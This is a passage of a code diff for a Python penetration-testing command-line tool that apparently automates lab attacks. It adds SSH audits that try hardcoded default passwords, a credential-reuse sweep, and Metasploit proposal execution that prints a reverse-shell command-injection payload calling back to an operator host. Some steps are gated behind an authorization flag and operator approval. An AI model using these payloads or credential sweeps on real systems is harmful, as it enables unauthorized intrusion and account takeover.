+            for svc in t.get("services", []):
+                try:
+                    ports.append(int(svc.get("port")))
+                except Exception:
+                    continue
+            return sorted(set(ports))
+    return []
+
+
 # ── Gravity command ──────────────────────────────────────────────────────
 
 def cmd_gravity(a):
@@ -649,14 +2063,62 @@ def cmd_gravity(a):
         print(f"  Error: {gravity_script} not found")
         return
 
+    try:
+        if hasattr(sys.stdout, "reconfigure"):
+            sys.stdout.reconfigure(line_buffering=True, write_through=True)
+        if hasattr(sys.stderr, "reconfigure"):
+            sys.stderr.reconfigure(line_buffering=True, write_through=True)
+    except Exception:
+        pass
+
     cycles = str(getattr(a, "cycles", 5) or 5)
     surface_path = _latest_surface()
     if not surface_path:
         print("  No surface data. Run: skg target add-subnet <cidr>")
         return
 
-    subprocess.call([sys.executable, str(gravity_script),
-                     "--surface", surface_path, "--cycles", cycles])
+    focus_target = getattr(a, "target", None)
+    if focus_target and "://" in str(focus_target):
+        parsed = urlparse(str(focus_target))
+        canonical_target = parsed.hostname or str(focus_target)
+        try:
+            surface_path = _register_web_observation_target(str(focus_target), None)
+            print(f"  Registered external-web target: {canonical_target}")
+        except Exception as exc:
+            print(f"  External target registration failed: {exc}")
+        focus_target = canonical_target
+
+    tmp_surface_path = None
+    try:
+        tmp_surface = tempfile.NamedTemporaryFile(
+            mode="w",
+            suffix=".json",
+            prefix="skg_surface_",
+            dir="/tmp",
+            delete=False,
+        )
+        tmp_surface.write(Path(surface_path).read_text())
+        tmp_surface.flush()
+        tmp_surface.close()
+        tmp_surface_path = tmp_surface.name
+
+        gravity_mod = _load_module_from_file("skg_gravity_field_runtime", gravity_script)
+        gravity_mod.gravity_field_loop(
+            tmp_surface_path or surface_path,
+            str(DISCOVERY_DIR),
+            max_cycles=int(cycles),
+            authorized=bool(getattr(a, "authorized", False)),
+            focus_target=focus_target,
+        )
+    except Exception as exc:
+        print(f"  Gravity runtime error: {exc}")
+        raise
+    finally:
+        if tmp_surface_path:
+            try:
+                Path(tmp_surface_path).unlink(missing_ok=True)
+            except Exception:
+                pass
 
 
 # ── Feed commands ────────────────────────────────────────────────────────
@@ -775,8 +2237,68 @@ def cmd_exploit(a):
         from exploit_dispatch import BINARY_ANALYSIS_CATALOG
         print(json.dumps(BINARY_ANALYSIS_CATALOG, indent=2))
 
+    elif subcmd == "cred-reuse":
+        # Credential reuse sweep against a target
+        sys.path.insert(0, str(SKG_HOME / "skg-gravity"))
+        from cred_reuse import CredentialStore, run_reuse_sweep, reuse_energy, extract_from_events, extract_from_targets_yaml
+
+        target = getattr(a, "target", None)
+        if not target:
+            print("  --target required")
+            return
+
+        store = CredentialStore()
+        # Refresh from events and targets
+        n_ev = extract_from_events(EVENTS_DIR, store)
+        n_ty = extract_from_targets_yaml(Path("/etc/skg/targets.yaml"), store)
+        if n_ev or n_ty:
+            print(f"  Extracted {len(n_ev)} from events, {len(n_ty)} from targets.yaml")
+
+        # Load surface for this target
+        surfaces = list(DISCOVERY_DIR.glob("surface_*.json"))
+        surface = {}
+        for sf in surfaces:
+            try:
+                data = json.loads(sf.read_text())
+                for t in data.get("targets", []):
+                    if t.get("ip") == target or t.get("host") == target:
+                        surface = t
+                        break
+            except Exception:
+                pass
+
+        E = reuse_energy(target, surface, store)
+        untested = store.untested_for(target)
+        print(f"  Target: {target}")
+        print(f"  Stored credentials: {store.count()}")
+        print(f"  Untested on target: {len(untested)}")
+        print(f"  Coupling energy E_cred = {E:.1f}")
+
+        if not untested:
+            print("  No untested credentials — nothing to sweep")
+            return
+
+        authorized = getattr(a, "authorized", False)
+        events = run_reuse_sweep(
+            target_ip=target,
+            surface=surface,
+            events_dir=EVENTS_DIR,
+            out_dir=DISCOVERY_DIR,
+            store=store,
+            authorized=authorized,
+        )
+        if events:
+            print(f"\n  {len(events)} wicket events emitted:")
+            for ev in events:
+                p = ev["payload"]
+                print(f"    {p['wicket_id']:8s} → {p['status']:10s}  {p['detail'][:70]}")
+        elif not authorized:
+            print(f"\n  {len(untested)} proposals generated (operator approval required)")
+            print(f"  Review: skg proposals list")
+            print(f"  To test directly: skg exploit cred-reuse --target {target} --authorized")
+
     else:
-        print("  Usage: skg exploit [propose|privesc|binary|list-paths|binary-catalog]")
+        print("  Usage: skg exploit [propose|privesc|binary|list-paths|binary-catalog|cred-reuse]")
 
 
 def _list_exploit_paths() -> list:
@@ -855,13 +2377,13 @@ def cmd_engage(a):
     subcmd = getattr(a, "engage_cmd", "report")
 
     if subcmd == "build":
-        db = getattr(a, "out", "/var/lib/skg/engagement.db")
+        db = getattr(a, "out", str(SKG_STATE_DIR / "engagement.db"))
         print(f"\n  Building engagement dataset: {db}")
         summary = build_engagement_db(db, verbose=True)
         print(f"\n  Done. Run: skg engage report --db {db}")
 
     elif subcmd == "analyze":
-        db = getattr(a, "db", "/var/lib/skg/engagement.db")
+        db = getattr(a, "db", str(SKG_STATE_DIR / "engagement.db"))
         if not Path(db).exists():
             print(f"  Database not found: {db}")
             print(f"  Build it first: skg engage build --out {db}")
@@ -869,7 +2391,7 @@ def cmd_engage(a):
         analyze_engagement_integrity(db, verbose=True)
 
     elif subcmd == "report":
-        db      = getattr(a, "db",  "/var/lib/skg/engagement.db")
+        db      = getattr(a, "db",  str(SKG_STATE_DIR / "engagement.db"))
         out_path = getattr(a, "out", None)
         if not Path(db).exists():
             print(f"\n  Building engagement database first...")
@@ -878,7 +2400,7 @@ def cmd_engage(a):
 
     else:
         # Default: build + report inline
-        db = "/var/lib/skg/engagement.db"
+        db = str(SKG_STATE_DIR / "engagement.db")
         print(f"\n  Building engagement dataset...")
         build_engagement_db(db, verbose=True)
         generate_engagement_report(db)
@@ -909,30 +2431,116 @@ def cmd_audit(a):
         wid    = getattr(a, "workload_id", None) or f"audit::{a.target}"
         apid   = getattr(a, "attack_path_id", "full_system_integrity_v1")
         checks = getattr(a, "checks", None)
-
+        selected_checks = [c.strip().lower() for c in (checks or "").split(",") if c.strip()] or None
         out_file = DISCOVERY_DIR / f"audit_{wid.replace('::', '_')}_{run_id}.ndjson"
-        ssh_args = [
-            str(SKG_HOME / "skg-host-toolchain" / "adapters" / "ssh_collect" / "parse.py"),
-            "--host",        a.target,
-            "--user",        getattr(a, "user", None) or "root",
-            "--out",         str(out_file),
-            "--attack-path-id", apid,
-            "--run-id",      run_id,
-            "--workload-id", wid,
-            "--audit-only",
-        ]
-        if getattr(a, "key", None):
-            ssh_args += ["--key", a.key]
-        if getattr(a, "password", None):
-            ssh_args += ["--password", a.password]
-        if checks:
-            ssh_args += ["--audit-checks", checks]
 
         print(f"\n  Auditing {a.target} ({wid})")
         print(f"  Checks: {checks or 'all (FI+PI+LI)'}")
         print()
         DISCOVERY_DIR.mkdir(parents=True, exist_ok=True)
-        subprocess.call([sys.executable] + ssh_args)
+        try:
+            import paramiko
+        except ImportError:
+            print("  paramiko not installed")
+            return
+
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        target_cfg = _load_target_config(a.target) or {}
+        explicit_user = getattr(a, "user", None)
+        explicit_key = getattr(a, "key", None)
+        explicit_password = getattr(a, "password", None)
+        port = int(getattr(a, "port", 22) or 22)
+
+        credential_attempts = []
+        seen_attempts = set()
+
+        def _add_attempt(user, key=None, password=None, label=""):
+            entry = (user or "", key or "", password or "")
+            if entry in seen_attempts:
+                return
+            seen_attempts.add(entry)
+            credential_attempts.append({
+                "username": user or "root",
+                "key_filename": str(Path(key).expanduser()) if key else None,
+                "password": password,
+                "label": label or (user or "root"),
+            })
+
+        if explicit_user or explicit_key or explicit_password:
+            _add_attempt(explicit_user or "root", explicit_key, explicit_password, "cli")
+        target_cfg_has_creds = bool(target_cfg.get("key") or target_cfg.get("password"))
+        if target_cfg:
+            _add_attempt(
+                target_cfg.get("user") or target_cfg.get("username") or "root",
+                target_cfg.get("key"),
+                target_cfg.get("password"),
+                "targets.yaml",
+            )
+        if not credential_attempts or not target_cfg_has_creds:
+            for user, password in [
+                ("msfadmin", "msfadmin"),
+                ("user", "user"),
+                ("root", "toor"),
+                ("root", "root"),
+                ("admin", "admin"),
+            ]:
+                _add_attempt(user, None, password, "lab-default")
+            _add_attempt("root", None, None, "agent")
+
+        connected_via = None
+        last_exc = None
+        for attempt in credential_attempts:
+            try:
+                connect_args = {
+                    "hostname": a.target,
+                    "port": port,
+                    "username": attempt["username"],
+                    "timeout": 20,
+                    "allow_agent": True,
+                    "look_for_keys": True,
+                }
+                if attempt.get("key_filename"):
+                    connect_args["key_filename"] = attempt["key_filename"]
+                    connect_args["allow_agent"] = False
+                    connect_args["look_for_keys"] = False
+                elif attempt.get("password") is not None:
+                    connect_args["password"] = attempt["password"]
+                    connect_args["allow_agent"] = False
+                    connect_args["look_for_keys"] = False
+                client.connect(**connect_args)
+                connected_via = attempt
+                break
+            except Exception as exc:
+                last_exc = exc
+
+        if not connected_via:
+            tried = ", ".join(
+                f"{a['username']}[{a['label']}]"
+                for a in credential_attempts[:6]
+            )
+            print(f"  SSH connect failed: {last_exc}")
+            if tried:
+                print(f"  Tried: {tried}")
+            print(f"  Configure /etc/skg/targets.yaml or pass --user/--password/--key")
+            return
+
+        print(f"  SSH connected as {connected_via['username']} ({connected_via['label']})")
+
+        try:
+            sys.path.insert(0, str(SKG_HOME / "skg-host-toolchain" / "adapters" / "sysaudit"))
+            from audit import run_sysaudit
+            events = run_sysaudit(client, a.target, wid, apid, run_id, checks=selected_checks)
+        except Exception as exc:
+            print(f"  Sysaudit failed: {exc}")
+            return
+        finally:
+            client.close()
+
+        with open(out_file, "w") as fh:
+            for ev in events:
+                ev.setdefault("payload", {})["target_ip"] = a.target
+                fh.write(json.dumps(ev) + "\n")
 
         if out_file.exists():
             events = [json.loads(l) for l in out_file.read_text().splitlines() if l.strip()]
@@ -1049,10 +2657,11 @@ def cmd_folds(a):
             print(f"    {ft:14s}: {count}")
         print()
         if folds:
-            print(f"  {'Target':18s} {'Type':12s} {'p':>5s} {'Φ':>5s}  Detail")
-            print(f"  {'-'*18} {'-'*12} {'-'*5} {'-'*5}  {'-'*50}")
+            print(f"  {'Target':18s} {'ID':12s} {'Type':12s} {'p':>5s} {'Φ':>5s}  Detail")
+            print(f"  {'-'*18} {'-'*12} {'-'*12} {'-'*5} {'-'*5}  {'-'*50}")
             for fold in folds[:20]:
                 print(f"  {fold.get('target_ip','?'):18s} "
+                      f"{fold.get('id','?')[:12]:12s} "
                       f"{fold.get('fold_type','?'):12s} "
                       f"{fold.get('discovery_probability',0):5.2f} "
                       f"{fold.get('gravity_weight',0):5.2f}  "
@@ -1072,7 +2681,7 @@ def cmd_folds(a):
         print(f"  Action: {result.get('action','')}")
         print()
         for fold in folds:
-            print(f"  {fold.get('target_ip','?'):18s}  Φ={fold.get('gravity_weight',0):.2f}")
+            print(f"  {fold.get('target_ip','?'):18s}  {fold.get('id','?')[:12]:12s} Φ={fold.get('gravity_weight',0):.2f}")
             print(f"    {fold.get('detail','')[:100]}")
             print()
 
@@ -1087,6 +2696,15 @@ def cmd_folds(a):
             print(f"  Remaining folds: {result.get('remaining_folds', '?')}")
             print(f"  Remaining gravity weight: {result.get('remaining_gravity_weight', '?')}")
         else:
+            offline = _resolve_fold_offline(a.target, a.fold_id)
+            if offline and offline.get("ok"):
+                print(f"  Fold {a.fold_id} resolved.")
+                print(f"  Remaining folds: {offline.get('remaining_folds', '?')}")
+                print(f"  Remaining gravity weight: {offline.get('remaining_gravity_weight', '?')}")
+                return
+            if offline and offline.get("error"):
+                print(f"  Failed: {offline['error']}")
+                return
             err = result.get("error", "unknown") if result else "daemon not running"
             print(f"  Failed: {err}")
 
@@ -1096,7 +2714,7 @@ def cmd_folds(a):
 
 def _print_folds_offline():
     """Read fold state from disk when daemon is not running."""
-    folds_dir = Path("/var/lib/skg/discovery/folds")
+    folds_dir = DISCOVERY_DIR / "folds"
     if not folds_dir.exists():
         print("  No fold state. Run: skg gravity --cycles 1")
         return
@@ -1106,7 +2724,7 @@ def _print_folds_offline():
             folds = json.loads(fold_file.read_text())
             ip = fold_file.stem.replace("folds_", "").replace("_", ".")
             for fold in folds:
-                print(f"  {ip:18s} [{fold.get('fold_type','?'):12s}] "
+                print(f"  {ip:18s} {fold.get('id','?')[:12]:12s} [{fold.get('fold_type','?'):12s}] "
                       f"p={fold.get('discovery_probability',0):.2f}  "
                       f"{fold.get('detail','')[:70]}")
                 total += 1
@@ -1116,6 +2734,28 @@ def _print_folds_offline():
         print("  No folds detected yet. Run: skg gravity --cycles 1")
     else:
         print(f"\n  Total: {total} folds")
+
+
+def _resolve_fold_offline(target_ip: str, fold_id: str):
+    fold_file = DISCOVERY_DIR / "folds" / f"folds_{target_ip.replace('.', '_')}.json"
+    if not fold_file.exists():
+        return None
+    folds = json.loads(fold_file.read_text())
+    matches = [f for f in folds if f.get("id", "") == fold_id or f.get("id", "").startswith(fold_id)]
+    if len(matches) > 1 and fold_id not in {f.get("id", "") for f in matches}:
+        return {"error": f"ambiguous fold id prefix for {target_ip}"}
+    if not matches:
+        return {"error": f"fold {fold_id} not found for {target_ip}"}
+    target_full_id = matches[0].get("id", "")
+    remaining = [f for f in folds if f.get("id", "") != target_full_id]
+    fold_file.write_text(json.dumps(remaining, indent=2))
+    remaining_weight = round(sum(float(f.get("gravity_weight", 0.0)) for f in remaining), 4)
+    return {
+        "ok": True,
+        "resolved": target_full_id,
+        "remaining_folds": len(remaining),
+        "remaining_gravity_weight": remaining_weight,
+    }
 
 
 def cmd_feed(a):
@@ -1129,7 +2769,19 @@ def cmd_feed(a):
 
         api_key = os.environ.get("NIST_NVD_API_KEY", "")
         if not api_key:
+            # Try loading from /etc/skg/skg.env (systemd daemon env file)
+            _env_file = Path("/etc/skg/skg.env")
+            if _env_file.exists():
+                for _line in _env_file.read_text().splitlines():
+                    _line = _line.strip()
+                    if _line.startswith("NIST_NVD_API_KEY="):
+                        api_key = _line.split("=", 1)[1].strip().strip('"').strip("'")
+                        if api_key:
+                            print(f"  [feed] Loaded NIST_NVD_API_KEY from /etc/skg/skg.env")
+                        break
+        if not api_key:
             print("  Error: Set NIST_NVD_API_KEY environment variable")
+            print("         or add NIST_NVD_API_KEY=<key> to /etc/skg/skg.env")
             return
 
         service = getattr(a, "service", None)
@@ -1182,7 +2834,7 @@ def cmd_identity(a):
                     print(f"  {k}: {v}")
         else:
             # Read from identity journal directly
-            journal = Path("/var/lib/skg/identity.jsonl")
+            journal = IDENTITY_FILE
             if journal.exists():
                 lines = [l.strip() for l in journal.read_text().splitlines() if l.strip()]
                 if lines:
@@ -1209,13 +2861,15 @@ def cmd_resonance(a):
         engine = _resonance_engine()
         print("[*] Ingesting catalogs, adapters, domains into resonance memory...")
         summary = ingest_all(engine, SKG_HOME)
-        w = summary.get("wickets_added", 0)
-        a = summary.get("adapters_added", 0)
-        d = summary.get("domains_added", 0)
+        domains = summary.get("domains", {})
+        w = summary.get("wickets_added", sum(v.get("new_wickets", 0) for v in domains.values()))
+        a = summary.get("adapters_added", sum(v.get("new_adapters", 0) for v in domains.values()))
+        d = summary.get("domains_added", len(domains))
+        processed = summary.get("toolchains_processed", sorted(domains.keys()))
         print(f"  Wickets   : {w}")
         print(f"  Adapters  : {a}")
         print(f"  Domains   : {d}")
-        print(f"  Toolchains: {', '.join(summary.get('toolchains_processed', []))}")
+        print(f"  Toolchains: {', '.join(processed)}")
         if summary.get("errors"):
             for e in summary["errors"]:
                 print(f"  [WARN] {e}")
@@ -1266,16 +2920,98 @@ def cmd_resonance(a):
 
     elif subcmd == "drafts":
         engine = _resonance_engine()
-        drafts = engine.list_drafts()
-        if not drafts:
-            print("No pending drafts.")
+        drafts_dir = getattr(engine, "_drafts_dir", None)
+        if not drafts_dir or not drafts_dir.exists():
+            print("  No resonance drafts directory present.")
             return
-        print(f"{len(drafts)} pending draft(s):\n")
-        for d in drafts:
-            meta = d.get("meta", {})
-            print(f"  {d['file']}")
-            print(f"    domain:  {meta.get('domain', '?')}")
-            print(f"    drafted: {meta.get('drafted_at', '?')}")
+
+        import json as _json
+        from pathlib import Path
+
+        pending = []
+        accepted = []
+        prompts = []
+
+        for path in sorted(drafts_dir.glob("pending_*.json"), key=lambda f: f.stat().st_mtime, reverse=True):
+            try:
+                data = _json.loads(path.read_text(encoding="utf-8"))
+            except Exception:
+                data = {}
+            pending.append((path, data))
+
+        for path in sorted(drafts_dir.glob("draft_*.json"), key=lambda f: f.stat().st_mtime, reverse=True):
+            try:
+                data = _json.loads(path.read_text(encoding="utf-8"))
+            except Exception:
+                data = {}
+            accepted.append((path, data))
+
+        for path in sorted(drafts_dir.glob("prompt_*.txt"), key=lambda f: f.stat().st_mtime, reverse=True):
+            prompts.append(path)
+
+        if not pending and not accepted and not prompts:
+            print("  No resonance drafts stored.")
+            return
+
+        print("  Resonance drafts:\n")
+
+        if pending:
+            print(f"  Pending ({len(pending)}):")
+            for path, data in pending[:15]:
+                domain = data.get("domain", "?")
+                status = data.get("status", "awaiting_response")
+                drafted_at = data.get("drafted_at", "?")
+                desc = (data.get("description", "") or "")[:70]
+                print(f"    {path.name:38s}  {status:18s}  {domain:18s}  {drafted_at}")
+                if desc:
+                    print(f"      {desc}")
+
+        if accepted:
+            print(f"\n  Saved drafts ({len(accepted)}):")
+            for path, data in accepted[:15]:
+                domain = data.get("domain", "?")
+                catalog = data.get("catalog", {}) if isinstance(data.get("catalog"), dict) else {}
+                wickets = len(catalog.get("wickets", {}) or {})
+                paths = len(catalog.get("attack_paths", {}) or {})
+                saved_at = data.get("saved_at", "?")
+                print(f"    {path.name:38s}  {domain:18s}  wickets={wickets:<3d} paths={paths:<3d}  {saved_at}")
+
+        if prompts:
+            print(f"\n  Prompt files ({len(prompts)}):")
+            for path in prompts[:10]:
+                print(f"    {path.name}")
+
+        interp_dir = INTERP_DIR
+        if interp_dir.exists():
+            recent = sorted(interp_dir.glob("*.json"), key=lambda f: f.stat().st_mtime, reverse=True)[:5]
+            if recent:
+                print(f"\n  Recent interpretations ({len(recent)} shown):")
+                for f in recent:
+                    try:
+                        d = _json.loads(f.read_text())
+                        p = d.get("payload", {})
+                        cls_ = p.get("classification", "?")
+                        ap = p.get("attack_path_id", "?")
+                        print(f"    {f.name:50s}  {cls_:16s}  {ap}")
+                    except Exception:
+                        print(f"    {f.name}")
+
+    elif subcmd == "ollama":
+        from skg.resonance.ollama_backend import OllamaBackend
+        backend = OllamaBackend()
+        status = backend.status()
+        print(f"  Available : {'yes' if status.get('available') else 'no'}")
+        print(f"  URL       : {status.get('url', '?')}")
+        print(f"  Selected  : {status.get('selected_model') or '(none)'}")
+        print(f"  Configured: {status.get('configured_model') or '(auto)'}")
+        print(f"  Temp      : {status.get('temperature', '?')}")
+        models = status.get("models", [])
+        if models:
+            print(f"  Models    : {', '.join(models)}")
+        elif status.get("available"):
+            print("  Models    : none")
+        if status.get("error"):
+            print(f"  Error     : {status['error']}")
 
 
 # ── Field command (per-workload) ─────────────────────────────────────────
@@ -1383,22 +3119,32 @@ def cmd_lateral(a):
 def cmd_catalog(a):
     subcmd = getattr(a, "catalog_cmd", None)
     if subcmd == "compile":
-        cmd = ["/opt/skg/.venv/bin/python3", "-m", "skg.forge.compiler",
+        cmd = [sys.executable, "-m", "skg.forge.compiler",
                "--domain", a.domain, "--description", a.description,
                "--min-cvss", str(a.min_cvss), "--max-wickets", str(a.max_wickets)]
         if a.packages: cmd += ["--packages", a.packages]
         if a.keywords: cmd += ["--keywords", a.keywords]
         if a.prefix: cmd += ["--prefix", a.prefix]
         if a.api_key: cmd += ["--api-key", a.api_key]
+        if getattr(a, "dry_run", False):
+            cmd += ["--dry-run"]
         if a.out:
             cmd += ["--out", a.out]
-        else:
+        elif not getattr(a, "dry_run", False):
             import re
             slug = re.sub(r"[^a-z0-9_]", "_", a.domain.lower())
-            out = f"/opt/skg/skg-{slug}-toolchain/contracts/catalogs/attack_preconditions_catalog.{slug}.v1.json"
-            Path(out).parent.mkdir(parents=True, exist_ok=True)
-            cmd += ["--out", out]
-        sys.exit(subprocess.call(cmd))
+            out_path = SKG_HOME / f"skg-{slug}-toolchain" / "contracts" / "catalogs" / f"attack_preconditions_catalog.{slug}.v1.json"
+            out_path.parent.mkdir(parents=True, exist_ok=True)
+            cmd += ["--out", str(out_path)]
+        env = dict(os.environ)
+        repo_root = str(REPO_ROOT)
+        current_pythonpath = env.get("PYTHONPATH", "")
+        if current_pythonpath:
+            if repo_root not in current_pythonpath.split(os.pathsep):
+                env["PYTHONPATH"] = os.pathsep.join([repo_root, current_pythonpath])
+        else:
+            env["PYTHONPATH"] = repo_root
+        sys.exit(subprocess.call(cmd, env=env))
     else:
         print("usage: skg catalog compile --domain DOMAIN --description DESC [options]")
 
@@ -1478,23 +3224,47 @@ def _execute_proposal(pr, action, rc, module, opts):
                 print(f"  Then retry:       skg proposals trigger {pr['id'][:8]} --await-session")
 
         elif rc and Path(rc).exists():
-            # Normal trigger: start listener in background, give instructions
-            log_file = DISCOVERY_DIR / f"msf_listener_{target_ip.replace('.','_')}_{run_id}.log"
-            print(f"  [EXECUTE] Starting listener in background...")
-            with open(log_file, "w") as lf:
-                proc = _sp.Popen([msf_bin, "-q", "-r", rc], stdout=lf, stderr=lf)
-            time.sleep(4)
-            if proc.poll() is None:
-                print(f"  [EXECUTE] ✓ Listener running (PID {proc.pid}), log: {log_file.name}")
+            is_listener = module == "exploit/multi/handler"
+            if is_listener:
+                # Listener-style proposals stay in the background while the
+                # operator delivers the already-confirmed payload.
+                log_file = DISCOVERY_DIR / f"msf_listener_{target_ip.replace('.','_')}_{run_id}.log"
+                print(f"  [EXECUTE] Starting listener in background...")
+                with open(log_file, "w") as lf:
+                    proc = _sp.Popen([msf_bin, "-q", "-r", rc], stdout=lf, stderr=lf)
+                time.sleep(4)
+                if proc.poll() is None:
+                    print(f"  [EXECUTE] ✓ Listener running (PID {proc.pid}), log: {log_file.name}")
+                else:
+                    print(f"  [EXECUTE] ✗ Listener exited — see {log_file.name}")
+                print()
+                print(f"  ── Deliver payload ─────────────────────────────────────")
+                print(f"  URL:     http://{target_ip}/vulnerabilities/exec/")
+                print(f"  Payload: ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+                print()
+                print(f"  ── After shell connects ────────────────────────────────")
+                print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
             else:
-                print(f"  [EXECUTE] ✗ Listener exited — see {log_file.name}")
-            print()
-            print(f"  ── Deliver payload ─────────────────────────────────────")
-            print(f"  URL:     http://{target_ip}/vulnerabilities/exec/")
-            print(f"  Payload: ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
-            print()
-            print(f"  ── After shell connects ────────────────────────────────")
-            print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
+                print(f"  [EXECUTE] Running RC synchronously...")
+                r_run = _sp.run(
+                    [msf_bin, "-q", "-r", rc],
+                    capture_output=True,
+                    text=True,
+                    timeout=90,
+                )
+                output += r_run.stdout + r_run.stderr
+                sess_check = _sp.run(
+                    [msf_bin, "-q", "-x", "sessions -l; exit"],
+                    capture_output=True, text=True, timeout=20
+                )
+                sess_out = sess_check.stdout + sess_check.stderr
+                output += "\n" + sess_out
+                m = re.search(r"^\s*(\d+)\s+(meterpreter|shell)", sess_out, re.M)
+                if m:
+                    session_id = m.group(1)
+                    print(f"  [EXECUTE] ✓ Session {session_id} opened")
+                else:
+                    print(f"  [EXECUTE] No session opened from synchronous RC")
 
         # Post-exploitation once session is confirmed
         if session_id:
@@ -1542,7 +3312,7 @@ def _execute_proposal(pr, action, rc, module, opts):
                 print(f"  [EXECUTE] {len(events)} wicket events → {events_file.name}")
 
                 # Mirror to EVENTS_DIR for daemon FeedbackIngester
-                events_dir = Path("/var/lib/skg/events")
+                events_dir = EVENTS_DIR
                 events_dir.mkdir(parents=True, exist_ok=True)
                 (events_dir / events_file.name).write_text(events_file.read_text())
 
@@ -1584,7 +3354,7 @@ def _run_post_projection(target_ip, events_file, run_id):
         proj = SKG_HOME / "skg-host-toolchain" / "projections" / "run.py"
         if not proj.exists():
             return
-        interp = Path("/var/lib/skg/interp") / f"host_{target_ip.replace('.','_')}_{run_id}.json"
+        interp = INTERP_DIR / f"host_{target_ip.replace('.','_')}_{run_id}.json"
         interp.parent.mkdir(parents=True, exist_ok=True)
         import subprocess as _sp
         _sp.run([sys.executable, str(proj),
@@ -1602,38 +3372,89 @@ def cmd_proposals(a):
     subcmd = a.proposal_cmd
     PDIR = SKG_STATE_DIR / "proposals"
 
+    def _normalize_status(pr: dict) -> dict:
+        pr = dict(pr)
+        status = pr.get("status", "")
+        if status == "auto_executed":
+            # Historical sync-exec records used auto_executed before the
+            # executed/returncode path was added. Treat finished runs without
+            # a live pid as executed for operator display.
+            if pr.get("returncode") is not None or not pr.get("pid"):
+                pr["status"] = "executed"
+        if status.startswith("error_missing"):
+            pr["status"] = "error_missing_rc"
+        return pr
+
     def _load(status_filter="pending"):
         items = []
         if not PDIR.exists():
             return items
         for f in sorted(PDIR.glob("*.json")):
             try:
-                d = json.loads(f.read_text())
+                d = _normalize_status(json.loads(f.read_text()))
                 if status_filter is None or d.get("status") == status_filter:
                     items.append(d)
             except Exception:
                 pass
-        return items
+        def _proposal_order_key(proposal):
+            active_statuses = {"pending", "triggered", "accepted_preserved_existing"}
+            status_rank = 0 if proposal.get("status") in active_statuses else 1
+            growth = ((proposal.get("recall") or {}).get("growth_memory") or {})
+            try:
+                growth_delta = float(growth.get("delta", 0.0) or 0.0)
+            except Exception:
+                growth_delta = 0.0
+            try:
+                confidence = float(proposal.get("confidence", 0.0) or 0.0)
+            except Exception:
+                confidence = 0.0
+            generated_ts = 0.0
+            try:
+                generated_ts = datetime.fromisoformat(str(proposal.get("generated_at", ""))).timestamp()
+            except Exception:
+                generated_ts = 0.0
+            return (
+                status_rank,
+                -growth_delta,
+                -confidence,
+                -generated_ts,
+            )
+        return sorted(items, key=_proposal_order_key)
 
     if subcmd == "list":
-        status = getattr(a, "status", "pending")
-        items  = _load(status)
+        status = getattr(a, "status", "all")
+        items  = _load(None if status == "all" else status)
         if not items:
             total = len(_load(None))
             print(f"  No {status} proposals. (Total in queue: {total})")
             return
-        header = "  {:<12s}  {:<14s}  {:<8s}  {:<18s}  {}".format(
-            "ID", "Kind", "Domain", "Target", "Description")
+        if status == "all":
+            active_statuses = {"pending", "triggered", "accepted_preserved_existing"}
+            active = [p for p in items if p.get("status") in active_statuses]
+            recent = [p for p in items if p.get("status") not in active_statuses]
+            print(f"\n  Active Queue: {len(active)} | Historical: {len(recent)}")
+            if active:
+                print("  What matters now: review pending proposals before historical records.\n")
+        header = "  {:<12s}  {:<18s}  {:<14s}  {:<8s}  {:<18s}  {}".format(
+            "ID", "Status", "Kind", "Domain", "Target", "Description")
         print("\n" + header)
-        print("  " + "-"*12 + "  " + "-"*14 + "  " + "-"*8 + "  " + "-"*18 + "  " + "-"*52)
-        for pr in items:
+        print("  " + "-"*12 + "  " + "-"*18 + "  " + "-"*14 + "  " + "-"*8 + "  " + "-"*18 + "  " + "-"*40)
+        ordered = items
+        if status == "all":
+            ordered = items
+        for pr in ordered:
+            status_s = pr.get("status", "?")[:18]
             kind   = pr.get("proposal_kind", "field_action")[:14]
             domain = pr.get("domain", "?")[:8]
             hosts  = pr.get("hosts") or [pr.get("attack_surface","?")]
             target = str(hosts[0] if hosts else "?")[:18]
-            desc   = pr.get("description", "")[:52]
+            maturity = ""
+            if kind == "toolchain_gener":
+                m = (pr.get("maturity", {}) or {}).get("level")
+                maturity = f" [{m}]" if m else ""
+            desc   = (pr.get("description", "")[:40] + maturity)[:40]
             pid    = pr.get("id","")[:12]
-            print(f"  {pid:12s}  {kind:14s}  {domain:8s}  {target:18s}  {desc}")
+            print(f"  {pid:12s}  {status_s:18s}  {kind:14s}  {domain:8s}  {target:18s}  {desc}")
         print("\n  {} proposal(s) | skg proposals trigger <id> | skg proposals show <id>".format(len(items)))
         return
 
@@ -1650,25 +3471,74 @@ def cmd_proposals(a):
         print(f"  Domain:   {pr.get('domain')}")
         print(f"  Target:   {pr.get('attack_surface') or pr.get('hosts')}")
         print(f"  Desc:     {pr.get('description')}")
+        maturity = pr.get("maturity")
+        if maturity:
+            print(f"  Maturity: {maturity.get('level')} ({maturity.get('reason')})")
+        if pr.get("confidence") is not None:
+            print(f"  Confidence: {float(pr.get('confidence', 0.0)):.2f}")
         action = pr.get("action", {})
         if action:
             print("\nAction:")
             print(f"    instrument: {action.get('instrument')}")
             if action.get("module"):
                 print(f"    module:     {action.get('module')}")
+            if action.get("confidence") is not None:
+                print(f"    confidence: {float(action.get('confidence', 0.0)):.2f}")
             if action.get("rc_file"):
                 print(f"    rc_file:    {action.get('rc_file')}")
             hint = action.get("dispatch",{}).get("command_hint","")
             if hint:
                 print(f"    run:        {hint}")
+        target_hint = str(pr.get("attack_surface") or pr.get("hosts") or "")
+        target_ip = None
+        for tok in target_hint.replace("[", " ").replace("]", " ").replace(",", " ").split():
+            if tok.count(".") == 3:
+                target_ip = tok
+                break
+        recall = _load_recall_summary(target_filter=target_ip, limit=3) if target_ip else None
+        if recall and (recall.get("confirmed") or recall.get("pending")):
+            rate = recall.get("confirmation_rate")
+            rate_s = f"{rate:.3f}" if rate is not None else "n/a"
+            print("\nRecall:")
+            print(f"    confirmed: {recall.get('confirmed', 0)}  pending: {recall.get('pending', 0)}  rate: {rate_s}")
+            for rec in recall.get("recent", [])[:2]:
+                print(f"    {str(rec.get('projection_confirmed','?')):10s} {str(rec.get('wicket_id','?')):12s} {rec.get('evidence_text','')[:80]}")
+        if pr.get("pid"):
+            print(f"  PID:      {pr.get('pid')}")
+        if pr.get("returncode") is not None:
